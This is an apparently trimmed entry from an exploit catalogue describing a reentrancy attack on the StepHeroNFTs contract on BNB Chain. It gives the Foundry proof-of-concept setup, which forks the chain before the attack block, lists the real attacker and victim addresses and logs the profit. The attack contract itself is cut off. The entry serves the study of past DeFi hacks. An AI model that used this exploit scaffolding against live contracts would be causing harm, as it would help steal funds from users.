# [?] StepHeroNFTs - Reentrancy On Sell NFT

## Summary
Severity: Unknown
Chain: BNB Chain
Component: StepHeroNFTs
Published: 2025-02-21
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/StepHeroNFTs_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 137.9 BNB
// Original Attacker : https://bscscan.com/address/0xFb1cc1548D039f14b02cfF9aE86757Edd2CDB8A5
// Attack Contract(Init) : https://bscscan.com/address/0xd4c80700ca911d5d3026a595e12aa4174f4cacb3
// Attack Contract(Main) : https://bscscan.com/address/0xb4c32404de3367ca94385ac5b952a7a84b5bdf76
// Attack Contract(Buyer) : https://bscscan.com/address/0x8f327e60fb2a7928c879c135453bd2b4ed6b0fe9
// Vulnerable Contract : https://bscscan.com/address/0x9823E10A0bF6F64F59964bE1A7f83090bf5728aB
// Attack Tx : https://bscscan.com/tx/0xef386a69ca6a147c374258a1bf40221b0b6bd9bc449a7016dbe5240644581877
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant pancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

address constant stepHeroNFTs = 0x9823E10A0bF6F64F59964bE1A7f83090bf5728aB;

contract StepHeroNFTs_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("bsc", 46843424 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);

        new AttackerC(attacker);

        emit log_named_decimal_uint("Profit in BNB", attacker.balance, 18);
    }
}

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/StepHeroNFTs_exp.sol_
